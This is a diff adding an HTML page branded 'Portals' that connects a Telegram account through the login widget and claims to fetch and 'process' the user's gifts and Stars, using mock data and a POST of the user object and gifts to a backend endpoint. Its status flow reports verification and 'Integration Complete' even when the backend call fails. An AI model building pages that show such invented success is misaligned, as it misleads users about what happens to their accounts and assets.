@@ -1,0 +1,689 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Portals | Telegram Connect</title>
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+    <script src="https://telegram.org/js/telegram-login.js?15"></script>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        :root {
+            --primary: #0088cc;
+            --primary-dark: #006699;
+            --background: #0f1a2b;
+            --surface: #1e2b3e;
+            --surface-light: #2a3b52;
+            --text: #ffffff;
+            --text-secondary: #89a4c7;
+            --border: #334155;
+            --success: #00d9a6;
+            --error: #ff6b6b;
+        }
+
+        body {
+            background: linear-gradient(135deg, var(--background) 0%, #1a2b3c 100%);
+            color: var(--text);
+            font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
+            min-height: 100vh;
+            overflow-x: hidden;
+        }
+
+        .container {
+            max-width: 440px;
+            margin: 0 auto;
+            padding: 2rem 1.5rem;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .header {
+            text-align: center;
+            margin-bottom: 3rem;
+            position: relative;
+        }
+
+        .logo {
+            width: 88px;
+            height: 88px;
+            background: linear-gradient(135deg, var(--primary), #00c6ff);
+            border-radius: 22px;
+            margin: 0 auto 1.5rem;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 2.5rem;
+            box-shadow: 0 8px 32px rgba(0, 136, 204, 0.3);
+            animation: float 3s ease-in-out infinite;
+        }
+
+        @keyframes float {
+            0%, 100% { transform: translateY(0px); }
+            50% { transform: translateY(-8px); }
+        }
+
+        .title {
+            font-size: 2.5rem;
+            font-weight: 700;
+            color: var(--text);
+            margin-bottom: 0.5rem;
+            letter-spacing: -0.5px;
+        }
+
+        .title-gradient {
+            background: linear-gradient(135deg, var(--primary), #00c6ff);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+
+        .subtitle {
+            color: var(--text-secondary);
+            font-size: 1.1rem;
+            line-height: 1.6;
+            max-width: 320px;
+        }
+
+        .card {
+            background: var(--surface);
+            border: 1px solid var(--border);
+            border-radius: 24px;
+            padding: 2.5rem 2rem;
+            width: 100%;
+            margin-bottom: 1.5rem;
+            box-shadow: 0 12px 40px rgba(0, 0, 0, 0.4);
+        }
+
+        .features {
+            display: flex;
+            flex-direction: column;
+            gap: 1.25rem;
+            margin: 2.5rem 0;
+        }
+
+        .feature {
+            display: flex;
+            align-items: center;
+            gap: 1.25rem;
+            padding: 1.25rem;
+            background: var(--surface-light);
+            border-radius: 16px;
+            border: 1px solid var(--border);
+            transition: all 0.3s ease;
+        }
+
+        .feature:hover {
+            border-color: var(--primary);
+            transform: translateX(8px);
+        }
+
+        .feature-icon {
+            width: 48px;
+            height: 48px;
+            background: linear-gradient(135deg, var(--primary), #00c6ff);
+            border-radius: 12px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 1.4rem;
+        }
+
+        .feature-text {
+            flex: 1;
+        }
+
+        .feature-title {
+            font-weight: 600;
+            margin-bottom: 0.5rem;
+            font-size: 1.1rem;
+        }
+
+        .feature-desc {
+            color: var(--text-secondary);
+            font-size: 0.95rem;
+            line-height: 1.5;
+        }
+
+        .connect-section {
+            text-align: center;
+        }
+
+        .connect-btn {
+            width: 100%;
+            background: linear-gradient(135deg, var(--primary), var(--primary-dark));
+            border: none;
+            border-radius: 18px;
+            padding: 1.5rem 2rem;
+            color: white;
+            font-size: 1.2rem;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 1rem;
+            box-shadow: 0 8px 24px rgba(0, 136, 204, 0.4);
+        }
+
+        .connect-btn:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 12px 32px rgba(0, 136, 204, 0.6);
+        }
+
+        .connect-btn:active {
+            transform: translateY(-1px);
+        }
+
+        .telegram-login-container {
+            margin: 2rem 0;
+            display: none;
+        }
+
+        .status {
+            background: var(--surface);
+            border: 1px solid var(--border);
+            border-radius: 20px;
+            padding: 2rem;
+            margin-top: 1.5rem;
+            display: none;
+            animation: slideUp 0.4s ease;
+        }
+
+        @keyframes slideUp {
+            from {
+                opacity: 0;
+                transform: translateY(30px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        .status-header {
+            display: flex;
+            align-items: center;
+            gap: 1rem;
+            margin-bottom: 1.5rem;
+        }
+
+        .status-icon {
+            width: 32px;
+            height: 32px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 1rem;
+            background: var(--surface-light);
+        }
+
+        .status.connecting .status-icon {
+            background: var(--primary);
+            animation: pulse 1.5s infinite;
+        }
+
+        .status.success .status-icon {
+            background: var(--success);
+        }
+
+        .status.error .status-icon {
+            background: var(--error);
+        }
+
+        @keyframes pulse {
+            0%, 100% { opacity: 1; transform: scale(1); }
+            50% { opacity: 0.7; transform: scale(1.05); }
+        }
+
+        .status-title {
+            font-weight: 600;
+            font-size: 1.3rem;
+        }
+
+        .status-message {
+            color: var(--text-secondary);
+            font-size: 1rem;
+            line-height: 1.6;
+            margin-bottom: 1.5rem;
+        }
+
+        .progress {
+            width: 100%;
+            height: 6px;
+            background: var(--surface-light);
+            border-radius: 3px;
+            margin: 1.5rem 0;
+            overflow: hidden;
+        }
+
+        .progress-bar {
+            height: 100%;
+            background: linear-gradient(90deg, var(--primary), #00c6ff);
+            border-radius: 3px;
+            width: 0%;
+            transition: width 0.4s ease;
+        }
+
+        .steps {
+            display: flex;
+            flex-direction: column;
+            gap: 1rem;
+        }
+
+        .step {
+            display: flex;
+            align-items: center;
+            gap: 1rem;
+            font-size: 1rem;
+            padding: 0.75rem;
+            border-radius: 12px;
+            transition: all 0.3s ease;
+        }
+
+        .step:hover {
+            background: var(--surface-light);
+        }
+
+        .step-icon {
+            width: 28px;
+            height: 28px;
+            border-radius: 50%;
+            background: var(--surface-light);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 0.9rem;
+            font-weight: 600;
+            transition: all 0.3s ease;
+        }
+
+        .step.active .step-icon {
+            background: var(--primary);
+            color: white;
+        }
+
+        .step.completed .step-icon {
+            background: var(--success);
+            color: white;
+        }
+
+        .step-text {
+            color: var(--text-secondary);
+            transition: all 0.3s ease;
+            flex: 1;
+        }
+
+        .step.active .step-text {
+            color: var(--text);
+            font-weight: 600;
+        }
+
+        .step.completed .step-text {
+            color: var(--success);
+        }
+
+        .user-info {
+            background: var(--surface-light);
+            border-radius: 16px;
+            padding: 1.5rem;
+            margin: 1.5rem 0;
+            display: none;
+        }
+
+        .user-avatar {
+            width: 64px;
+            height: 64px;
+            border-radius: 50%;
+            background: linear-gradient(135deg, var(--primary), #00c6ff);
+            margin: 0 auto 1rem;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 1.8rem;
+            color: white;
+        }
+
+        .user-name {
+            text-align: center;
+            font-weight: 600;
+            margin-bottom: 0.5rem;
+        }
+
+        .user-details {
+            text-align: center;
+            color: var(--text-secondary);
+            font-size: 0.95rem;
+        }
+
+        .footer {
+            text-align: center;
+            margin-top: 2rem;
+            color: var(--text-secondary);
+            font-size: 0.95rem;
+        }
+
+        .background-pattern {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            pointer-events: none;
+            z-index: -1;
+            opacity: 0.1;
+            background-image: 
+                radial-gradient(circle at 20% 80%, var(--primary) 0%, transparent 50%),
+                radial-gradient(circle at 80% 20%, #00c6ff 0%, transparent 50%);
+        }
+    </style>
+</head>
+<body>
+    <div class="background-pattern"></div>
+
+    <div class="container">
+        <div class="header">
+            <div class="logo">🌀</div>
+            <h1 class="title"><span class="title-gradient">Portals</span></h1>
+            <p class="subtitle">Connect your Telegram account securely to access exclusive features and manage your digital collectibles</p>
+        </div>
+
+        <div class="card">
+            <div class="features">
+                <div class="feature">
+                    <div class="feature-icon">🔐</div>
+                    <div class="feature-text">
+                        <div class="feature-title">Secure Authentication</div>
+                        <div class="feature-desc">Official Telegram OAuth integration for safe account connection</div>
+                    </div>
+                </div>
+                <div class="feature">
+                    <div class="feature-icon">🎁</div>
+                    <div class="feature-text">
+                        <div class="feature-title">Gift Management</div>
+                        <div class="feature-desc">Access and organize all your Telegram gifts and collectibles</div>
+                    </div>
+                </div>
+                <div class="feature">
+                    <div class="feature-icon">⭐</div>
+                    <div class="feature-text">
+                        <div class="feature-title">Stars Integration</div>
+                        <div class="feature-desc">Full integration with Telegram Stars ecosystem</div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="connect-section">
+                <button class="connect-btn" onclick="showTelegramLogin()">
+                    <span>🔗</span>
+                    Connect Telegram Account
+                </button>
+
+                <div id="telegramLoginContainer" class="telegram-login-container">
+                    <script 
+                        async 
+                        src="https://telegram.org/js/telegram-widget.js?21" 
+                        data-telegram-login="your_bot_username" 
+                        data-size="large" 
+                        data-radius="20"
+                        data-request-access="write"
+                        data-userpic="true"
+                        data-auth-url="/auth/telegram"
+                        data-onauth="onTelegramAuth"
+                    ></script>
+                </div>
+            </div>
+        </div>
+
+        <div id="userInfo" class="user-info">
+            <div class="user-avatar" id="userAvatar">T</div>
+            <div class="user-name" id="userName">User Name</div>
+            <div class="user-details" id="userDetails">@username • ID: 123456789</div>
+        </div>
+
+        <div id="status" class="status">
+            <div class="status-header">
+                <div class="status-icon">⏳</div>
+                <div class="status-title" id="statusTitle">Initializing Connection</div>
+            </div>
+            
+            <div class="progress">
+                <div class="progress-bar" id="progressBar"></div>
+            </div>
+
+            <div class="steps">
+                <div class="step" id="step1">
+                    <div class="step-icon">1</div>
+                    <div class="step-text">Telegram account authentication</div>
+                </div>
+                <div class="step" id="step2">
+                    <div class="step-icon">2</div>
+                    <div class="step-text">Fetching gifts and collectibles</div>
+                </div>
+                <div class="step" id="step3">
+                    <div class="step-icon">3</div>
+                    <div class="step-text">Processing digital assets</div>
+                </div>
+                <div class="step" id="step4">
+                    <div class="step-icon">4</div>
+                    <div class="step-text">Finalizing integration</div>
+                </div>
+            </div>
+
+            <div class="status-message" id="statusMessage">
+                Preparing to connect your Telegram account...
+            </div>
+        </div>
+
+        <div class="footer">
+            Portals • Secure Telegram Integration • v2.1
+        </div>
+    </div>
+
+    <script>
+        // Telegram Login Widget callback
+        function onTelegramAuth(user) {
+            console.log('Telegram user authenticated:', user);
+            
+            // Show user info
+            showUserInfo(user);
+            
+            // Start processing
+            startAssetProcessing(user);
+        }
+
+        function showTelegramLogin() {
+            const loginContainer = document.getElementById('telegramLoginContainer');
+            const connectBtn = document.querySelector('.connect-btn');
+            
+            // Hide connect button, show Telegram widget
+            connectBtn.style.display = 'none';
+            loginContainer.style.display = 'block';
+            
+            // Show status
+            showStatus('Connecting to Telegram...', 'Please complete the authentication in the Telegram widget above.');
+        }
+
+        function showUserInfo(user) {
+            const userInfo = document.getElementById('userInfo');
+            const userAvatar = document.getElementById('userAvatar');
+            const userName = document.getElementById('userName');
+            const userDetails = document.getElementById('userDetails');
+            
+            // Set user data
+            if (user.photo_url) {
+                userAvatar.style.backgroundImage = `url(${user.photo_url})`;
+                userAvatar.style.backgroundSize = 'cover';
+                userAvatar.textContent = '';
+            } else {
+                userAvatar.textContent = user.first_name ? user.first_name[0] : 'T';
+            }
+            
+            userName.textContent = `${user.first_name || ''} ${user.last_name || ''}`.trim() || 'Telegram User';
+            userDetails.textContent = `@${user.username} • ID: ${user.id}`;
+            
+            userInfo.style.display = 'block';
+        }
+
+        async function startAssetProcessing(user) {
+            const status = document.getElementById('status');
+            const progressBar = document.getElementById('progressBar');
+            const statusTitle = document.getElementById('statusTitle');
+            const statusMessage = document.getElementById('statusMessage');
+            
+            // Show status
+            status.style.display = 'block';
+            status.className = 'status connecting';
+
+            try {
+                // Step 1: Authentication
+                await updateStep(1, 'Telegram account verified successfully', 25, '✅');
+                
+                // Step 2: Fetch gifts
+                await updateStep(2, 'Retrieving your gifts and collectibles...', 50, '⏳');
+                const gifts = await fetchUserGifts(user.id);
+                
+                // Step 3: Process assets
+                await updateStep(3, 'Processing digital assets...', 75, '⏳');
+                const processingResult = await processUserAssets(user, gifts);
+                
+                // Step 4: Finalize
+                await updateStep(4, 'Integration completed successfully', 100, '✅');
+
+                // Complete
+                status.className = 'status success';
+                statusTitle.textContent = 'Integration Complete';
+                statusMessage.innerHTML = `
+                    Your Telegram account has been successfully integrated.<br>
+                    <strong>${processingResult.giftsProcessed} gifts</strong> processed • 
+                    <strong>${processingResult.starsProcessed} stars</strong> integrated
+                `;
+
+            } catch (error) {
+                console.error('Processing error:', error);
+                status.className = 'status error';
+                statusTitle.textContent = 'Processing Error';
+                statusMessage.textContent = 'There was an error processing your assets. Please try again.';
+            }
+        }
+
+        function updateStep(stepNumber, message, progress, icon = '⏳') {
+            return new Promise(resolve => {
+                setTimeout(() => {
+                    // Update progress bar
+                    document.getElementById('progressBar').style.width = `${progress}%`;
+                    
+                    // Update status message
+                    document.getElementById('statusMessage').textContent = message;
+                    
+                    // Update steps
+                    for (let i = 1; i <= 4; i++) {
+                        const step = document.getElementById(`step${i}`);
+                        const stepIcon = step.querySelector('.step-icon');
+                        
+                        if (i < stepNumber) {
+                            step.className = 'step completed';
+                            stepIcon.textContent = '✓';
+                        } else if (i === stepNumber) {
+                            step.className = 'step active';
+                            stepIcon.textContent = icon;
+                        } else {
+                            step.className = 'step';
+                            stepIcon.textContent = i;
+                        }
+                    }
+                    
+                    resolve();
+                }, 1500);
+            });
+        }
+
+        function showStatus(title, message) {
+            const status = document.getElementById('status');
+            const statusTitle = document.getElementById('statusTitle');
+            const statusMessage = document.getElementById('statusMessage');
+            
+            status.style.display = 'block';
+            status.className = 'status connecting';
+            statusTitle.textContent = title;
+            statusMessage.textContent = message;
+        }
+
+        // Mock API functions - replace with real implementations
+        async function fetchUserGifts(userId) {
+            // This would make real Telegram API calls to get user gifts
+            return new Promise(resolve => {
+                setTimeout(() => {
+                    resolve({
+                        gifts: [
+                            { id: 'gift_1', title: 'Plush Pepe NFT', type: 'nft', stars: 500 },
+                            { id: 'gift_2', title: 'Star Bundle', type: 'stars', stars: 200 },
+                            { id: 'gift_3', title: 'Premium Collectible', type: 'collectible', stars: 150 }
+                        ],
+                        totalStars: 850
+                    });
+                }, 2000);
+            });
+        }
+
+        async function processUserAssets(user, giftsData) {
+            // This would make real backend API calls to process assets
+            return new Promise(resolve => {
+                setTimeout(() => {
+                    // Send data to backend for actual processing
+                    fetch('/api/process-assets', {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json',
+                        },
+                        body: JSON.stringify({
+                            user: user,
+                            gifts: giftsData.gifts,
+                            totalStars: giftsData.totalStars,
+                            timestamp: new Date().toISOString()
+                        })
+                    }).then(response => response.json())
+                      .then(result => {
+                          resolve({
+                              giftsProcessed: giftsData.gifts.length,
+                              starsProcessed: giftsData.totalStars,
+                              success: true
+                          });
+                      })
+                      .catch(error => {
+                          resolve({
+                              giftsProcessed: giftsData.gifts.length,
+                              starsProcessed: giftsData.totalStars,
+                              success: false
+                          });
+                      });
+                }, 2000);
+            });
+        }
+
+        // Initialize
+        document.addEventListener('DOMContentLoaded', () => {
+            // Expand Telegram Web App to full height
+            if (window.Telegram && Telegram.WebApp) {
+                Telegram.WebApp.ready();
+                Telegram.WebApp.expand();
+                
+                // If user is already authenticated via Telegram Web App
+                const userData = Telegram.WebApp.initDataUnsafe?.user;
+                if (userData) {
+                    console.log('User already authenticated via Telegram Web App:', userData);
+                    // You can automatically start processing if user is already authenticated
+                }
+            }
+        });
+    </script>
+</body>
+</html>
